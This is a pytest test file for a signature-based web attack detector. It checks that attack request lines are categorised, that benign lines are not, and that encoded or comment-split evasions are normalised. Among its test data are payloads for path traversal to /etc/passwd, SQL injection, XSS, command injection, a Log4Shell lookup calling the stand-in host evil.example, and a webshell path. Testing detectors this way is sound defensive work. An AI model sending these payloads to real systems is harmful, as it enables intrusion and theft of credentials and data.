import pytest

from signature_rules import match

@pytest.mark.parametrize('text,category', [
    ('GET /../../../../etc/passwd HTTP/1.1', 'path_traversal'),
    ('GET /?id=1 UNION SELECT user,pass FROM users', 'sql_injection'),
    ('GET /?q=<script>alert(1)</script>', 'xss'),
    ('GET /?x=$(whoami)', 'command_injection'),
    ('GET /?x=${jndi:ldap://evil.example/a}', 'log4shell'),
    ('GET /uploads/c99.php', 'webshell'),
    ('User-Agent: sqlmap/1.7', 'scanner_tool'),
    ('GET /.env HTTP/1.1', 'sensitive_path'),
])
def test_each_category_matches(text, category):
    result = match(text)
    assert result is not None
    assert result[0] == category

@pytest.mark.parametrize('text', [
    'GET /api/orders HTTP/1.1',
    'GET /static/style.css HTTP/1.1',
    'GET /catalog?category=environment',
    'GET /api/select-plan',
    'Accepted password for deploy from 10.0.0.5 port 22 ssh2',
])
def test_benign_lines_do_not_match(text):
    assert match(text) is None

@pytest.mark.parametrize('text,category', [
    ('GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'path_traversal'),
    ('GET /%252e%252e%252f%252e%252e%252fetc%252fpasswd', 'path_traversal'),
    ('GET /?id=1 UNI/**/ON SEL/**/ECT 1', 'sql_injection'),
    ('GET /?id=1 UNION/**/SELECT 1', 'sql_injection'),
    ('GET /?id=1%20UNION%20SELECT%201', 'sql_injection'),
])
def test_common_evasions_are_normalised(text, category):
    result = match(text)
    assert result is not None
    assert result[0] == category
